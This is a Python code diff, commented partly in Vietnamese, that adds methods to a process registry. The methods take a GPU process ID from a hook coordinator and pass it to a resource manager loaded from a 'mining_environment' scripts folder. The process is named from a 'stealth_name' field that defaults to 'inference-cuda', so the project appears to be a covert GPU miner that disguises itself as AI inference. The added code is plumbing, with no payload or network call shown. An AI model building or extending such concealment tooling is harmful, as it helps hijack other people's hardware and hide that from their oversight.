@@ -316,6 +316,63 @@ class DirectPIDRegistry:
             logger.error(f"❌ Failed to unregister observer: {e}")
             return False
     
+    def receive_from_coordinator(self, pid: int, coordinator_metadata: Dict[str, Any]) -> bool:
+        """
+        **Receive From Coordinator** (nhận từ coordinator)
+        
+        NEW METHOD: Linear flow entry point từ HookCoordinator.
+        Implements: HookCoordinator → DirectPIDRegistry → ResourceManager
+        
+        Args:
+            pid: Process ID từ coordinator
+            coordinator_metadata: Metadata từ coordinator forwarding
+            
+        Returns:
+            bool: True nếu processing successful
+        """
+        try:
+            logger.info(f"🔄 [COORDINATOR-RECEIVE] Receiving PID {pid} from HookCoordinator")
+            logger.debug(f"🔍 [COORDINATOR-RECEIVE] Coordinator metadata: {coordinator_metadata}")
+            
+            # **Extract process information from metadata** (trích xuất thông tin tiến trình từ metadata)
+            process_name = coordinator_metadata.get('stealth_name', 'inference-cuda')
+            source_chain = coordinator_metadata.get('source_chain', [])
+            
+            # **Create ProcessInfo object** (tạo đối tượng ProcessInfo)
+            with self._lock:
+                process_info = ProcessInfo(
+                    pid=pid,
+                    process_type="gpu",
+                    process_obj=None,  # Will be resolved later
+                    process_name=process_name,
+                    registered_at=time.time(),
+                    start_time=coordinator_metadata.get('timestamp', time.time()),
+                    is_active=True,
+                    metadata=coordinator_metadata
+                )
+                
+                # **Register in central registry** (đăng ký vào registry trung tâm)
+                self._registry[pid] = process_info
+                self._stats['total_registered'] += 1
+                self._stats['active_processes'] = len([p for p in self._registry.values() if p.is_active])
+                
+                logger.info(f"✅ [COORDINATOR-RECEIVE] Registered process: PID={pid}, Name={process_name}")
+                logger.info(f"🔗 [COORDINATOR-RECEIVE] Source chain: {' → '.join(source_chain)}")
+            
+            # **Forward to ResourceManager** (chuyển tiếp đến ResourceManager)
+            rm_success = self._forward_to_resource_manager(pid, coordinator_metadata, process_info)
+            
+            if rm_success:
+                logger.info(f"✅ [COORDINATOR-RECEIVE] Complete linear flow successful for PID {pid}")
+                return True
+            else:
+                logger.warning(f"⚠️ [COORDINATOR-RECEIVE] ResourceManager forwarding failed for PID {pid}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ [COORDINATOR-RECEIVE] Failed to receive from coordinator for PID {pid}: {e}")
+            return False
+    
     def register_process(self, pid: int, process_type: str, process_obj: Any, 
                         process_name: str = None, metadata: Dict[str, Any] = None) -> bool:
         """
@@ -401,6 +458,86 @@ class DirectPIDRegistry:
         
         self._stats['notifications_sent'] += notification_count
         logger.info(f"📢 Sent {notification_count} direct notifications for PID {process_info.pid}")
+    
+    def _forward_to_resource_manager(self, pid: int, coordinator_metadata: Dict[str, Any], process_info: ProcessInfo) -> bool:
+        """
+        **Forward to ResourceManager** (chuyển tiếp đến ResourceManager)
+        
+        Final step trong linear flow: DirectPIDRegistry → ResourceManager
+        
+        Args:
+            pid: Process ID
+            coordinator_metadata: Metadata từ coordinator
+            process_info: ProcessInfo object
+            
+        Returns:
+            bool: True nếu forwarding successful
+        """
+        try:
+            logger.info(f"🎯 [RM-FORWARD] Forwarding PID {pid} to ResourceManager (FINAL STEP)")
+            
+            # **Import ResourceManager** (nhập ResourceManager)
+            import sys
+            import os
+            from pathlib import Path
+            
+            # Add scripts module to path
+            scripts_path = Path(__file__).parent.parent / "mining_environment" / "scripts"
+            if str(scripts_path) not in sys.path:
+                sys.path.insert(0, str(scripts_path))
+            
+            try:
+                from resource_manager import ResourceManager
+                
+                # **Get ResourceManager singleton** (lấy singleton ResourceManager)
+                rm_instance = ResourceManager._instance
+                if not rm_instance:
+                    logger.warning(f"⚠️ [RM-FORWARD] ResourceManager instance not yet created")
+                    return False
+                
+                # **Enhanced metadata for ResourceManager** (metadata nâng cao cho ResourceManager)
+                rm_metadata = {
+                    **coordinator_metadata,  # Include all previous metadata
+                    'registry_timestamp': time.time(),
+                    'source_chain': coordinator_metadata.get('source_chain', []) + ['direct_registry'],
+                    'final_handoff': True,
+                    'process_info': {
+                        'pid': pid,
+                        'process_type': process_info.process_type,
+                        'process_name': process_info.process_name,
+                        'registered_at': process_info.registered_at
+                    }
+                }
+                
+                # **Call ResourceManager receive method** (gọi phương thức receive của ResourceManager)
+                if hasattr(rm_instance, 'receive_from_registry'):
+                    success = rm_instance.receive_from_registry(pid, rm_metadata)
+                    
+                    if success:
+                        logger.info(f"✅ [RM-FORWARD] ResourceManager receive successful for PID {pid}")
+                        
+                        # **Notify observers** (thông báo observers)
+                        self._notify_observers(process_info)
+                        
+                        return True
+                    else:
+                        logger.error(f"❌ [RM-FORWARD] ResourceManager receive failed for PID {pid}")
+                        return False
+                else:
+                    logger.warning(f"⚠️ [RM-FORWARD] ResourceManager missing receive_from_registry method")
+                    
+                    # **Fallback: Notify observers directly** (dự phòng: thông báo observers trực tiếp)
+                    self._notify_observers(process_info)
+                    logger.info(f"🔄 [RM-FORWARD] Fallback notification completed for PID {pid}")
+                    return True
+                    
+            except ImportError as import_err:
+                logger.error(f"❌ [RM-FORWARD] Cannot import ResourceManager: {import_err}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ [RM-FORWARD] Failed to forward to ResourceManager for PID {pid}: {e}")
+            return False
     
     def _trigger_sequential_handoff(self, process_info: ProcessInfo) -> None:
         """
